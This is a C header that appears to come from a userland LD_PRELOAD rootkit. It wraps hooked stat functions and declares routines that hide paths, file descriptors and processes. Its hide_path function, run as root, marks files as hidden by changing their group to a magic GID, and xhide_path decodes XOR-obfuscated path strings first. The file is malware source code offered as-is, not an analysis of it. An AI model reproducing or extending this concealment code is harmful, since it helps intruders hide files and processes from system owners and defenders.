#ifndef FILES_H
#define FILES_H

#define mxstat(pathname, s) (long)call(C__XSTAT, _STAT_VER, pathname, s)
#define mxstat64(pathname, s) (long)call(C__XSTAT64, _STAT_VER, pathname, s)
#define mfxstat(fd, s) (long)call(C__FXSTAT, _STAT_VER, fd, s)
#define mfxstat64(fd, s) (long)call(C__FXSTAT64, _STAT_VER, fd, s)
#define mlxstat(pathname, s) (long)call(C__LXSTAT, _STAT_VER, pathname, s)
#define mlxstat64(pathname, s) (long)call(C__LXSTAT64, _STAT_VER, pathname, s)
gid_t get_path_gid(const char *pathname);
gid_t get_path_gid64(const char *pathname);
static gid_t lget_path_gid(const char *pathname);
static gid_t lget_path_gid64(const char *pathname);
static gid_t get_fd_gid(int fd);
static gid_t get_fd_gid64(int fd);
#include "get_path_gid.c"

#define MODE_REG 0x32
#define MODE_64  0x64

int _hidden_path(const char *pathname, short mode);
static int _f_hidden_path(int fd, short mode);
static int _l_hidden_path(const char *pathname, short mode);
static int hidden_proc(pid_t pid);
#include "hidden.c"

#define hidden_path(path) _hidden_path(path, MODE_REG)
#define hidden_path64(path) _hidden_path(path, MODE_64)
#define hidden_fd(fd) _f_hidden_path(fd, MODE_REG)
#define hidden_fd64(fd) _f_hidden_path(fd, MODE_64)
#define hidden_lpath(path) _l_hidden_path(path, MODE_REG)
#define hidden_lpath64(path) _l_hidden_path(path, MODE_64)

static int chown_path(char *path, gid_t gid){
    hook(CCHOWN);
    return (long)call(CCHOWN, path, 0, gid);
}

#define PATH_ERR   -1
#define PATH_DONE   1
#define PATH_SUCC   0

static int hide_path(char *path){
	if(not_user(0))
		return PATH_ERR;
	if(hidden_path(path))
		return PATH_DONE;
	return chown_path(path, MAGIC_GID);
}

static int xhide_path(const char *path){
        xor(_path, path);
        int ret = hide_path(_path);
        clean(_path);
        return ret;
}

#endif
